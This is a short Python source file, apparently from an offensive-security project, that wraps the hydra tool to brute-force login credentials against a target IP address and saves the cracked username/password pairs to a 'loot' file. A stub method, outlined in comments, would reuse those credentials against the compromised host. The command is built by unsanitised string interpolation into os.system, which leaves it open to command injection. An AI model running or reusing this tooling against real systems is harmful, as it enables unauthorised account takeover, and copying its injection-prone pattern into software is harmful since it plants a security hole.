import os
"""Example hydra usage: hydra -l userlist.txt -P passlist.txt server://ip_addr"""

class Exploit:
    """A type of supported Hydra exploit. Don't instantiate this directly."""
    def __init__(self):
        self.name = 'exploit'
        
    def attack(self, ip_address, usernames, passwords):
        """Run brute force attack against known IP address to find valid credentials"""
        file_name = f'../data/loot_{ip_address}_{self.name}.txt'
        os.system(f"hydra -L {usernames} -P {passwords} -o {file_name} {self.name}://{ip_address}")
        # os.system("hydra -L {usernames} -P {passwords} {ip_address} {self.name} -o  ")
        return_list = []
        try:
            loot_file = open(file_name, 'r')
        except:
            return return_list

        loot_file.readline()
        for loot in loot_file.readlines():
            line = loot.split(" ")
            return_list.append((line[4], line[6]))
        return return_list

    def getloot(self, ip_address, credentials):
        """Attack compromised IP address with known credentials"""
        # for loop to get in using previous credentials from attack()
            # if success
                # finger
        # return list of tuples
        raise NotImplementedError